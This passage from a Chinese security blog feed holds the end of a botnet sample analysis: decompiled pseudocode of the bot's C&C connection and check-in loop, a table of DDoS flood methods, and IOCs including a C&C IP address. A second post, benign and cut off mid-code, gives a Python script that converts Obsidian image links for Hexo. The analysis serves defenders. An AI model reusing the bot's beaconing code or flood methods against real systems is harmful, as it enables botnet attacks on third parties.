class="line">                    v53[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line">                    v53[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                    v24 = select(v23 + <span class="number">1</span>, v48, v47, <span class="number">0</span>, v53);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( v24 == <span class="number">-1</span> );</span><br><span class="line">                  <span class="keyword">if</span> ( !v24 )                   <span class="comment">// 使用select判断是否连接成功</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v37 = v45 % <span class="number">6</span> == <span class="number">0</span>;</span><br><span class="line">                    v58[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                    ++v45;</span><br><span class="line">                    <span class="keyword">if</span> ( v37 )</span><br><span class="line">                      send(fd_serv, v58, <span class="number">2</span>, <span class="number">0x4000</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( fd_ctrl != <span class="number">-1</span></span><br><span class="line">                    &amp;&amp; ((*(<span class="type">int</span> *)&amp;v58[<span class="number">2</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)fd_ctrl &gt;&gt; <span class="number">5</span>) - <span class="number">103</span>] &gt;&gt; (fd_ctrl &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v55 = <span class="number">16</span>;</span><br><span class="line">                    accept(fd_ctrl, (<span class="type">int</span>)&amp;v50, (<span class="type">int</span>)&amp;v55);</span><br><span class="line">                    kill(-v44, <span class="number">9</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( watchdog_pid )</span><br><span class="line">                      kill(watchdog_pid, <span class="number">9</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  v25 = (<span class="type">unsigned</span> __int8)pending_connection;</span><br><span class="line">                  <span class="keyword">if</span> ( !pending_connection )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  v26 = *(<span class="type">int</span> *)&amp;v58[<span class="number">2</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)fd_serv &gt;&gt; <span class="number">5</span>) - <span class="number">167</span>] &gt;&gt; (fd_serv &amp; <span class="number">0x1F</span>);</span><br><span class="line">                  pending_connection = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( (v26 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( fd_serv != <span class="number">-1</span> )</span><br><span class="line">                      close(fd_serv);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v55 = <span class="number">0</span>;</span><br><span class="line">                  v56 = <span class="number">4</span>;</span><br><span class="line">                  getsockopt(fd_serv, <span class="number">1</span>, <span class="number">4</span>, &amp;v55, &amp;v56);</span><br><span class="line">                  <span class="keyword">if</span> ( v55 )                    <span class="comment">// 如果失败，关闭套接字，随后重试</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v34 = close(fd_serv);</span><br><span class="line">                    fd_serv = <span class="number">-1</span>;</span><br><span class="line">                    v35 = rand_next(v34);</span><br><span class="line">                    sleep(v35 % <span class="number">0xA</span> + <span class="number">1</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v36 = util_strlen(v49);</span><br><span class="line">                    LOBYTE(v58[<span class="number">0</span>]) = v36;</span><br><span class="line">                    LOCAL_ADDR = util_local_addr(v36);</span><br><span class="line">                    send(fd_serv, &amp;unk_20CEC, <span class="number">4</span>, <span class="number">0x4000</span>);</span><br><span class="line">                    send(fd_serv, v58, <span class="number">1</span>, <span class="number">0x4000</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( LOBYTE(v58[<span class="number">0</span>]) )</span><br><span class="line">                      send(fd_serv, v49, LOBYTE(v58[<span class="number">0</span>]), <span class="number">0x4000</span>);<span class="comment">// 如果成功，发送上线包</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( fd_serv == <span class="number">-1</span></span><br><span class="line">                   || ((*(<span class="type">int</span> *)&amp;v58[<span class="number">2</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)fd_serv &gt;&gt; <span class="number">5</span>) - <span class="number">103</span>] &gt;&gt; (fd_serv &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) == <span class="number">0</span> );</span><br><span class="line">              v58[<span class="number">0</span>] = (<span class="type">unsigned</span> __int8)pending_connection;</span><br><span class="line">              v27 = (_DWORD *)_errno_location();</span><br><span class="line">              *v27 = v25;</span><br><span class="line">              v28 = v27;</span><br><span class="line">              v29 = recv(fd_serv, v58, <span class="number">2</span>, <span class="number">16386</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v29 != <span class="number">-1</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v37 = *v28 == <span class="number">4</span>;</span><br><span class="line">              <span class="keyword">if</span> ( *v28 != <span class="number">4</span> )</span><br><span class="line">                v37 = *v28 == <span class="number">11</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !v37 )</span><br><span class="line">              &#123;</span><br><span class="line">LABEL_58:</span><br><span class="line">                v38 = fd_serv;</span><br><span class="line">                <span class="keyword">if</span> ( fd_serv == <span class="number">-1</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">LABEL_59:</span><br><span class="line">                close(v38);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
<p>该函数通过<code>select</code>等一些列函数，验证与C&amp;C正确连接。&#x3D;&#x3D;值得注意的是，这里的上线包貌似是命令行第一个参数（后续需要验证）。&#x3D;&#x3D;</p>
<h1 id="命令分发"><a href="#命令分发" class="headerlink" title="命令分发"></a>命令分发</h1><p>在保证了正确连接之后，将从服务器接收命令，进行命令分发：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521184822.png"
                      alt="20250521184822"
                ><br>在这里，通过接收攻击方式，附加属性，调用attack_parse函数，进行对应方式的攻击，对于附加信息的逆向，由于这里不打算复原控制端，对于协议逆向，这里没有深入分析。</p>
<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><p>对于攻击方式，在初始化部分，<code>attack_init</code>函数中，在初始化攻击向量的时候，我们就可以很明显的看到：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521185144.png"
                      alt="20250521185144"
                ><br>这里我们来总结一下：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>攻击方式</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>tcp_stomp</td>
</tr>
<tr>
<td>1</td>
<td>udp_plain</td>
</tr>
<tr>
<td>2</td>
<td>tcp_ack</td>
</tr>
<tr>
<td>3</td>
<td>tcp_syn</td>
</tr>
<tr>
<td>4</td>
<td>method_hexflood</td>
</tr>
<tr>
<td>5</td>
<td>method_std</td>
</tr>
<tr>
<td>6</td>
<td>method_nudp</td>
</tr>
<tr>
<td>7</td>
<td>udp_bypass</td>
</tr>
<tr>
<td>8</td>
<td>tcp_bypass</td>
</tr>
<tr>
<td>9</td>
<td>tcp_legit</td>
</tr>
<tr>
<td>10</td>
<td>udp_vse</td>
</tr>
<tr>
<td>11</td>
<td>tcp_sack</td>
</tr>
<tr>
<td>12</td>
<td>discord</td>
</tr>
<tr>
<td>13</td>
<td>app_http</td>
</tr>
<tr>
<td>OK，对于该样本的分析就到这里，希望对大家有所帮助。</td>
<td></td>
</tr>
<tr>
<td>另外对于防护规则，如Snort，yara检测规则等，如有需要，请私信我获取。</td>
<td></td>
</tr>
</tbody></table>
<h1 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h1><p>文件hash：61ccee5da06acc92f930839404f50b8422451970<br>C&amp;C：65.222.202.53</p>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>样本分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Obsidian笔记到Hexo图片链接转换</title>
    <url>/2025/03/12/Obsidian%E7%AC%94%E8%AE%B0%E5%88%B0Hexo%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h1 id="超链接格式修改"><a href="#超链接格式修改" class="headerlink" title="超链接格式修改"></a>超链接格式修改</h1><p>最近写了个CTF刷题记录，里面有很多图片文件，之前我都是上传在图床的，但是这次太多了，手动改起来很麻烦，这里就写了一个脚本，有需要可以使用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> argparse  </span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> bisect_left  </span><br><span class="line">  </span><br><span class="line">ALLOWED_EXTS = &#123;<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.svg&#x27;</span>&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChangeTracker</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, original_content</span>):  </span><br><span class="line">        <span class="variable language_">self</span>.changes = []  </span><br><span class="line">        <span class="comment"># 预计算行尾位置  </span></span><br><span class="line">        <span class="variable language_">self</span>.line_ends = [m.end() <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\n&#x27;</span>, original_content)]  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_line_number</span>(<span class="params">self, pos</span>):  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据字符位置计算行号&quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">return</span> bisect_left(<span class="variable language_">self</span>.line_ends, pos) + <span class="number">1</span>  <span class="comment"># 行号从1开始  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enhanced_converter</span>(<span class="params"><span class="keyword">match</span>, img_dir</span>):  </span><br><span class="line">    raw_path = <span class="keyword">match</span>.group(<span class="number">1</span>).split(<span class="string">&#x27;|&#x27;</span>)[<span class="number">0</span>].strip()  </span><br><span class="line">    basename = os.path.basename(raw_path)  </span><br><span class="line">    name, ext = os.path.splitext(basename)  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> ext.lower() <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_EXTS:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 标记跳过  </span></span><br><span class="line">      </span><br><span class="line">    clean_dir = img_dir.rstrip(<span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;![<span class="subst">&#123;name&#125;</span>](<span class="subst">&#123;clean_dir&#125;</span><span class="subst">&#123;basename&#125;</span>)&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_markdown</span>(<span class="params">file_path, img_dir, debug=<span class="literal">True</span></span>):  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            content = f.read()  </span><br><span class="line">            tracker = ChangeTracker(content)  </span><br><span class="line">            pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;!\[\[\s*([^$$\|]+?)\s*\]\]&#x27;</span>, re.IGNORECASE)  </span><br><span class="line">              </span><br><span class="line">            <span class="comment"># 构建新内容并记录修改  </span></span><br><span class="line">            new_content = []  </span><br><span class="line">            last_pos = <span class="number">0</span>  </span><br><span class="line">            change_count = <span class="number">0</span>  </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> pattern.finditer(content):  </span><br><span class="line">                start, end = <span class="keyword">match</span>.span()  </span><br><span class="line">                new_text = enhanced_converter(<span class="keyword">match</span>, img_dir)  </span><br><span class="line">                  </span><br><span class="line">                <span class="comment"># 记录未修改内容  </span></span><br><span class="line">                <span class="keyword">if</span> start &gt; last_pos:  </span><br><span class="line">                    new_content.append(content[last_pos:start])  </span><br><span class="line">                  </span><br><span class="line">                <span class="keyword">if</span> new_text:  </span><br><span class="line">                    <span class="comment"># 记录修改  </span></span><br><span class="line">                    change_count += <span class="number">1</span>  </span><br><span class="line">                    line_num = tracker.get_line_number(start)  </span><br><span class="line">                    old_line = content[content.rfind(<span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>, start)+<span class="number">1</span> : content.find(<span class="string">&#x27;\n&#x27;</span>, end)]  </span><br><span class="line">                      </span><br><span class="line">                    tracker.changes.append(&#123;  </span><br><span class="line">                        <span class="string">&#x27;line&#x27;</span>: line_num,  </span><br><span class="line">                        <span class="string">&#x27;old&#x27;</span>: <span class="keyword">match</span>.group(<span class="number">0</span>).strip(),  </span><br><span class="line">                        <span class="string">&#x27;new&#x27;</span>: new_text,  </span><br><span class="line">                        <span class="string">&#x27;context&#x27;</span>: old_line  </span><br><span class="line">                    &#125;)  </span><br><span class="line">                    new_content.append(new_text)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    new_content.append(content[start:end])  </span><br><span class="line">                  </span><br><span class="line">                last_pos = end  </span><br><span class="line">              </span><br><span class="line">            <span class="comment"># 添加最后一段  </span></span><br><span class="line">            new_content.append(content[last_pos:])  </span><br><span class="line">            new_content = <span class="string">&#x27;&#x27;</span>.join(new_content)  </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">if</span> debug <span class="keyword">and</span> change_count &gt; <span class="number">0</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n=== 详细修改记录 ===&quot;</span>)  </span><br><span class="line">                <span class="keyword">for</span> change <span class="keyword">in</span> tracker.changes:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;行号 <span class="subst">&#123;change[<span class="string">&#x27;line&#x27;</span>]&#125;</span>:&quot;</span>)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  原内容: <span class="subst">&#123;change[<span class="string">&#x27;old&#x27;</span>]&#125;</span>&quot;</span>)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  新内容: <span class="subst">&#123;change[<span class="string">&#x27;new&#x27;</span>]&#125;</span>&quot;</span>)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  上下文: ...<span class="subst">&#123;change[<span class="string">&#x27;context&#x27;</span>]&#125;</span>...\n&quot;</span> + <span class="string">&quot;-&quot;</span>*<span class="number">60</span>)  </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">if</span> change_count &gt; <span class="number">0</span>:  </span><br><span class="line">                f.seek(<span class="number">0</span>)  </span><br><span class="line">                f.write(new_content)  </span><br><span class="line">                f.truncate()  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\033[32m成功\033[0m 共修改 <span class="subst">&#123;change_count&#125;</span> 处&quot;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\033[33m提示\033[0m 未发现需要修改的内容&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[31m错误\033[0m 处理失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Obsidian笔记到Hexo图片链接转换器&#x27;</span>)  </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Markdown文件路径&#x27;</span>)  </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--img-dir&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;图片目录路径&#x27;</span>)  </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;显示详细修改位置&#x27;</span>)  </span><br><span class="line">    args = parser.parse_args()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(args.file):  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m错误\033[0m 文件不存在&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span> 转换开始 <span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span>&quot;</span>)  </span><br><span class="line">    process_markdown(args.file, args.img_dir, args.debug)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span> 转换结束 <span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<h2 id="使用方式："><a href="#使用方式：" class="headerlink" title="使用方式："></a>使用方式：</h2><p>使用方式举例：要修改a.md中的图片链接，图片位于&#x2F;image&#x2F;BUUCTF:<br>使用命令：<code>python a.py -f a.md -i /image</code><br>这将会：将<code>![[aaaaaaa.jpg]]</code>，修改为：<code>![aaaaaaa](/images/aaaaaaa.jpg)</code>。</p>
<h1 id="Pasted-image-格式修改"><a href="#Pasted-image-格式修改" class="headerlink" title="Pasted image 格式修改"></a>Pasted image 格式修改</h1><p>后续在使用的过程中，对于粘贴图片，会出现这样的格式：形如：Pasted image 20250513094420.png，对于这种图片，我们不仅要修改超链接，还需要修改对应的文件名。<br>&#x3D;&#x3D;注意：我这里将形如：Pasted image 20250513094420.png文件名直接修改为：20250513094420.png&#x3D;&#x3D;</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> bisect_left</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ALLOWED_EXTS = &#123;<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.svg&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChangeTracker</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, original_content</span>):</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.changes = []</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.line_ends = [m.end() <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\n&#x27;</span>, original_content)]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_line_number</span>(<span class="params">self, pos</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bisect_left(<span class="variable language_">self</span>.line_ends, pos) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enhanced_converter</span>(<span class="params"><span class="keyword">match</span>, img_dir</span>):</span><br><span class="line"></span><br><span class="line">    raw_path = <span class="keyword">match</span>.group(<span class="number">1</span>).split(<span class="string">&#x27;|&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">    basename = os.path.basename(raw_path)</span><br><span class="line"></span><br><span class="line">    name, ext = os.path.splitext(basename)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ext.lower() <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_EXTS:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 特别处理 &quot;Pasted image XXXXX.png&quot;</span></span><br><span class="line"></span><br><span class="line">    pasted_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;Pasted image (\d&#123;14&#125;)&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pasted_match:</span><br><span class="line"></span><br><span class="line">        new_name = pasted_match.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        basename = <span class="string">f&quot;<span class="subst">&#123;new_name&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        name = new_name</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    clean_dir = img_dir.rstrip(<span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;![<span class="subst">&#123;name&#125;</span>](<span class="subst">&#123;clean_dir&#125;</span><span class="subst">&#123;basename&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_markdown</span>(<span class="params">file_path, img_dir, debug=<span class="literal">True</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">            content = f.read()</span><br><span class="line"></span><br><span class="line">            tracker = ChangeTracker(content)</span><br><span class="line"></span><br><span class="line">            pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;!\[\[\s*([^$\|\]]+?)\s*\]\]&#x27;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            new_content = []</span><br><span class="line"></span><br><span class="line">            last_pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            change_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> pattern.finditer(content):</span><br><span class="line"></span><br><span class="line">                start, end = <span class="keyword">match</span>.span()</span><br><span class="line"></span><br><span class="line">                new_text = enhanced_converter(<span class="keyword">match</span>, img_dir)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> start &gt; last_pos:</span><br><span class="line"></span><br><span class="line">                    new_content.append(content[last_pos:start])</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> new_text:</span><br><span class="line"></span><br><span class="line">                    change_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    line_num = tracker.get_line_number(start)</span><br><span class="line"></span><br><span class="line">                    old_line = content[content.rfind(<span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>, start)+<span class="number">1</span> : content.find(<span class="string">&#x27;\n&#x27;</span>, end)]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                    tracker.changes.append(&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="string">&#x27;line&#x27;</span>: line_num,</span><br><span class="line"></span><br><span class="line">                        <span class="string">&#x27;old&#x27;</span>: <span class="keyword">match</span>.group(<span class="number">0</span>).strip(),</span><br><span class="line"></span><br><span class="line">                        <span class="string">&#x27;new&#x27;</span>: new_text,</span><br><span class="line"></span><br><span class="line">                        <span class="string">&#x27;context&#x27;</span>: old_line</span><br><span class="line"></span><br><span class="line">                    &#125;)</span><br><span class="line"></span><br><span class="line">                    new_content.append(new_text)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    new_content.append(content[start:end])</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                last_pos = end</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            new_content.append(content[last_pos:])</span><br><span class="line"></span><br><span class="line">            new_content = <span class="string">&#x27;&#x27;</span>.join(new_content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> debug <span class="keyword">and</span> change_count &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n=== 详细修改记录 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> change <span class="keyword">in</span> tracker.changes:</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;行号 <span class="subst">&#123;change[<span class="string">&#x27;line&#x27;</span>]&#125;</span>:&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  原内容: <span class="subst">&#123;change[<span class="string">&#x27;old&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  新内容: <span class="subst">&#123;change[<span class="string">&#x27;new&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  上下文: ...<span class="subst">&#123;change[<span class="string">&#x27;context&#x27;</span>]&#125;</span>...\n&quot;</span> + <span class="string">&quot;-&quot;</span>*<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> change_count &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">                f.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                f.write(new_content)</span><br><span class="line"></span><br><span class="line">                f.truncate()</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\033[32m成功\033[0m 共修改 <span class="subst">&#123;change_count&#125;</span> 处&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\033[33m提示\033[0m 未发现需要修改的内容&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[31m错误\033[0m 处理失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_pasted_images</span>(<span class="params">asset_dir</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(asset_dir):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[31m错误\033[0m 指定目录不存在: <span class="subst">&#123;asset_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    renamed_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(asset_dir):</span><br><span class="line"></span><br><span class="line">        old_path = os.path.join(asset_dir, filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(old_path):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        name, ext = os.path.splitext(filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ext.lower() <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_EXTS:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span 